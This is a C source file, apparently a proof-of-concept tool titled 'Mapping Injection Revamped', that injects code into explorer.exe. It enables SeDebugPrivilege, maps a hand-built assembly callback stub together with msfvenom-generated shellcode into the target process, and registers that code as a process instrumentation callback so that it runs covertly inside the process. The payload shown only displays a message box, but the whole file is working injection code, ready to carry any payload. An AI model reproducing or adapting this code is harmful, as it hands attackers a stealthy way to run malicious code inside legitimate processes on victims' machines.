#include "stdio.h"
#include "Windows.h"
#include <tlhelp32.h>

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
	ULONG Version;
	ULONG Reserved;
	PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation = 0,
	ProcessQuotaLimits = 1,
	ProcessIoCounters = 2,
	ProcessVmCounters = 3,
	ProcessTimes = 4,
	ProcessBasePriority = 5,
	ProcessRaisePriority = 6,
	ProcessDebugPort = 7,
	ProcessExceptionPort = 8,
	ProcessAccessToken = 9,
	ProcessLdrInformation = 10,
	ProcessLdtSize = 11,
	ProcessDefaultHardErrorMode = 12,
	ProcessIoPortHandlers = 13,
	ProcessPooledUsageAndLimits = 14,
	ProcessWorkingSetWatch = 15,
	ProcessUserModeIOPL = 16,
	ProcessEnableAlignmentFaultFixup = 17,
	ProcessPriorityClass = 18,
	ProcessWx86Information = 19,
	ProcessHandleCount = 20,
	ProcessAffinityMask = 21,
	ProcessPriorityBoost = 22,
	ProcessDeviceMap = 23,
	ProcessSessionInformation = 24,
	ProcessForegroundInformation = 25,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessLUIDDeviceMapsEnabled = 28,
	ProcessBreakOnTermination = 29,
	ProcessDebugObjectHandle = 30,
	ProcessDebugFlags = 31,
	ProcessHandleTracing = 32,
	ProcessIoPriority = 33,
	ProcessExecuteFlags = 34,
	ProcessTlsInformation = 35,
	ProcessCookie = 36,
	ProcessImageInformation = 37,
	ProcessCycleTime = 38,
	ProcessPagePriority = 39,
	ProcessInstrumentationCallback = 40, // that's what we need
	ProcessThreadStackAllocation = 41,
	ProcessWorkingSetWatchEx = 42,
	ProcessImageFileNameWin32 = 43,
	ProcessImageFileMapping = 44,
	ProcessAffinityUpdateMode = 45,
	ProcessMemoryAllocationMode = 46,
	ProcessGroupInformation = 47,
	ProcessTokenVirtualizationEnabled = 48,
	ProcessConsoleHostProcess = 49,
	ProcessWindowInformation = 50,
	MaxProcessInfoClass
} PROCESSINFOCLASS;

#ifndef _MSC_VER //for mingw
typedef PVOID MEM_EXTENDED_PARAMETER;
#endif

typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(HANDLE ProcessHandle, PROCESS_INFORMATION_CLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
typedef PVOID(NTAPI* pMapViewOfFile3)(HANDLE FileMapping, HANDLE Process, PVOID BaseAddress,ULONG64 Offset, SIZE_T ViewSize, ULONG AllocationType, ULONG PageProtection, MEM_EXTENDED_PARAMETER* ExtendedParameters, ULONG ParameterCount);

//source callback.asm
char callback[] = { 0x48,0xba,0xff,0xff,0xff,0xff,0xff,0x7f,0x00,0x00,0x80,0x3a,0x00,0x74,0x02,0xeb,0x34,0x41,0x52,0x50,0x53,0x55,0x57,0x56,0x54,0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,0x48,0x83,0xec,0x20,0x48,0x8d,0x0d,0x9d,0x01,0x00,0x00,0xe8,0x17,0x00,0x00,0x00,0x48,0x83,0xc4,0x20,0x41,0x5f,0x41,0x5e,0x41,0x5d,0x41,0x5c,0x5c,0x5e,0x5f,0x5d,0x5b,0x58,0x41,0x5a,0x41,0xff,0xe2,0x48,0x89,0x54,0x24,0x10,0x48,0x89,0x4c,0x24,0x08,0x57,0x48,0x81,0xec,0xa0,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x68,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x70,0x30,0x00,0x00,0x00,0x48,0x8d,0x44,0x24,0x78,0x48,0x89,0xc7,0x31,0xc0,0xb9,0x28,0x00,0x00,0x00,0xf3,0xaa,0x48,0x8b,0x84,0x24,0xb8,0x00,0x00,0x00,0xc6,0x00,0x01,0x48,0xc7,0x44,0x24,0x50,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x40,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x38,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0x8b,0x84,0x24,0xb0,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x20,0x49,0xc7,0xc1,0xff,0xff,0xff,0xff,0x4c,0x8d,0x44,0x24,0x70,0xba,0x00,0x00,0x00,0x20,0x48,0x8d,0x4c,0x24,0x68,0xe8,0x1f,0x00,0x00,0x00,0x89,0x44,0x24,0x60,0x83,0x7c,0x24,0x60,0x00,0x74,0x0b,0x48,0x8b,0x84,0x24,0xb8,0x00,0x00,0x00,0xc6,0x00,0x00,0x48,0x81,0xc4,0xa0,0x00,0x00,0x00,0x5f,0xc3,0x65,0x67,0x48,0xa1,0x60,0x00,0x00,0x00,0x81,0xb8,0x20,0x01,0x00,0x00,0x00,0x28,0x00,0x00,0x74,0x64,0x81,0xb8,0x20,0x01,0x00,0x00,0x5a,0x29,0x00,0x00,0x74,0x5f,0x81,0xb8,0x20,0x01,0x00,0x00,0x39,0x38,0x00,0x00,0x74,0x5a,0x81,0xb8,0x20,0x01,0x00,0x00,0xd7,0x3a,0x00,0x00,0x74,0x55,0x81,0xb8,0x20,0x01,0x00,0x00,0xab,0x3f,0x00,0x00,0x74,0x50,0x81,0xb8,0x20,0x01,0x00,0x00,0xee,0x42,0x00,0x00,0x74,0x4b,0x81,0xb8,0x20,0x01,0x00,0x00,0x63,0x45,0x00,0x00,0x74,0x46,0x81,0xb8,0x20,0x01,0x00,0x00,0xba,0x47,0x00,0x00,0x74,0x41,0x81,0xb8,0x20,0x01,0x00,0x00,0xbb,0x47,0x00,0x00,0x74,0x3c,0x7f,0x41,0xeb,0x46,0xb8,0xb3,0x00,0x00,0x00,0xeb,0x44,0xb8,0xb4,0x00,0x00,0x00,0xeb,0x3d,0xb8,0xb6,0x00,0x00,0x00,0xeb,0x36,0xb8,0xb9,0x00,0x00,0x00,0xeb,0x2f,0xb8,0xba,0x00,0x00,0x00,0xeb,0x28,0xb8,0xbb,0x00,0x00,0x00,0xeb,0x21,0xb8,0xbc,0x00,0x00,0x00,0xeb,0x1a,0xb8,0xbd,0x00,0x00,0x00,0xeb,0x13,0xb8,0xbd,0x00,0x00,0x00,0xeb,0x0c,0xb8,0xc1,0x00,0x00,0x00,0xeb,0x05,0xb8,0xff,0xff,0xff,0xff,0x49,0x89,0xca,0x0f,0x05,0xc3,0x90 }; 
char init_global_vars = '\x00';

BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
void EnableDebugPrivilege();
DWORD GetProcessIdByName(wchar_t* processName);
LPVOID MappingInjectionAlloc(HANDLE hProc, char* buffer, SIZE_T bufferSize, DWORD protectionType);


int main()
{
	/*msfvenom -p windows/x64/messagebox TEXT='Mapping Injection Revamped!' EXITFUNC=thread -f raw > shellcode.bin && python bin2cbuffer.py shellcode.bin shellcode
      shellcode on the stack*/
	char shellcode[] = { 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x36,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,0x20,0x49,0x6e,0x6a,0x65,0x63,0x74,0x69,0x6f,0x6e,0x20,0x52,0x65,0x76,0x61,0x6d,0x70,0x65,0x64,0x21,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00 };
	wchar_t targetProcess[] = L"explorer.exe";
	HANDLE hProc = NULL;
	DWORD targetPid = 0;
	char* finalCallback;

	printf("\n\tMapping Injection Revamped!\n\t@splinter_code\n\n");

	pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtSetInformationProcess");
	EnableDebugPrivilege();
	targetPid = GetProcessIdByName(targetProcess);
	if (targetPid == 0) {
		printf("Pid of process %S not found. Exiting...\n", targetProcess);
		exit(-1);
	}
	else {
		printf("Found target pid of process %S = %d \n", targetProcess, targetPid);
		hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_SET_INFORMATION, FALSE, (DWORD)targetPid);
	}
	if (hProc == NULL) {
		printf("Can't open process %S. Last Error = %d \n", targetProcess, GetLastError());
		exit(-1);
	}

	LPVOID globalVarAddr = MappingInjectionAlloc(hProc, &init_global_vars, sizeof(init_global_vars), PAGE_READWRITE);
	finalCallback = malloc(sizeof(callback) + sizeof(shellcode));
	memcpy((void*)&callback[2], (void*)&globalVarAddr, 8);
	memcpy((void*)finalCallback, (void*)&callback[0], sizeof(callback));
	memcpy((void*)(finalCallback+sizeof(callback)), (void*)&shellcode[0], sizeof(shellcode));
	LPVOID callbackAddr = MappingInjectionAlloc(hProc, finalCallback, sizeof(callback) + sizeof(shellcode), PAGE_EXECUTE_READ);

	//https://github.com/ionescu007/HookingNirvana/blob/9e4e8e326b9dfd10a7410986486e567e5980f913/instrument/main.c#L205
	PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION nirvana;
	nirvana.Callback = (PVOID)(ULONG_PTR)callbackAddr;
	nirvana.Reserved = 0; // always 0
	nirvana.Version = 0; // 0 for x64, 1 for x86

	NTSTATUS status = NtSetInformationProcess(hProc, (PROCESS_INFORMATION_CLASS)ProcessInstrumentationCallback, &nirvana, sizeof(nirvana));

	if (status != (NTSTATUS)0)
		printf("NtSetInformationProcess failed with ntstatus code 0x%x \nDo you have SeDebugPrivilege?\n", status);
	else
		printf("Instrumentation callback set successfully, code in the target process will be run soon\n");
	CloseHandle(hProc);
	return 0;
}


BOOL SetPrivilege(HANDLE hToken, wchar_t* lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValueW(NULL, lpszPrivilege,&luid))
	{
		printf("LookupPrivilegeValueW() failed, error %u\r\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL,	(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges() failed, error %u \r\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

void EnableDebugPrivilege() {
	HANDLE currentProcessToken = NULL;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
	SetPrivilege(currentProcessToken, L"SeDebugPrivilege", TRUE);
	CloseHandle(currentProcessToken);
}

DWORD GetProcessIdByName(wchar_t* processName) {
	PROCESSENTRY32W entry;
	entry.dwSize = sizeof(PROCESSENTRY32W);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD pidFound = 0;
	if (Process32FirstW(snapshot, &entry) == TRUE)
	{
		while (Process32NextW(snapshot, &entry) == TRUE)
		{
			if (_wcsicmp(entry.szExeFile, processName) == 0) {
				pidFound = entry.th32ProcessID;
				break;
			}
		}
	}
	CloseHandle(snapshot);
	return pidFound;
}

LPVOID MappingInjectionAlloc(HANDLE hProc, char *buffer, SIZE_T bufferSize, DWORD protectionType) {
	pMapViewOfFile3 MapViewOfFile3 = (pMapViewOfFile3)GetProcAddress(GetModuleHandleW(L"kernelbase.dll"), "MapViewOfFile3");
	HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)bufferSize, NULL);
	if (hFileMap == NULL)
	{
		printf("CreateFileMapping failed with error: %d\n", GetLastError());
		exit(-1);
	}
	printf("Created file mapping object\n");
	LPVOID lpMapAddress = MapViewOfFile3(hFileMap, GetCurrentProcess(), NULL, 0, 0, 0, PAGE_READWRITE, NULL, 0);
	if (lpMapAddress == NULL)
	{
		printf("MapViewOfFile failed with error: %d\n", GetLastError());
		exit(-1);
	}
	memcpy((PVOID)lpMapAddress, buffer, bufferSize);
	printf("Written %d bytes to the mapping object\n", (DWORD)bufferSize);
	LPVOID lpMapAddressRemote = MapViewOfFile3(hFileMap, hProc, NULL, 0, 0, 0, protectionType, NULL, 0);
	if (lpMapAddressRemote == NULL)
	{
		printf("\nMapViewOfFile3 failed with error: %d\n", GetLastError());
		exit(-1);
	}
	printf("Injected object mapping to the remote process \n");
	UnmapViewOfFile(hFileMap);
	CloseHandle(hFileMap);
	return lpMapAddressRemote;
}